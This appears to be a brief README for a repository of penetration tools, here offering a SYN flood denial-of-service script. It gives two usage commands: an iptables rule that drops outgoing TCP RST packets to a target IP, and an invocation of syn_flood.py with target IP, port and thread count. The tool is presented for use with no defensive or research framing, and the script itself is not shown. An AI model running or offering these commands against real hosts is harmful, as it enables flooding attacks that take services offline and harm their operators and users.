# hack
常见的渗透技术和工具
#help
You can use this tool for SYN attack！！！
## how to use?
1. sudo iptables -A OUTPUT -p TCP --tcp-flags  rst rst -d [IP地址] -j DROP
 
2. sudo python3 ./syn_flood.py [IP地址] [端口] [线程数]
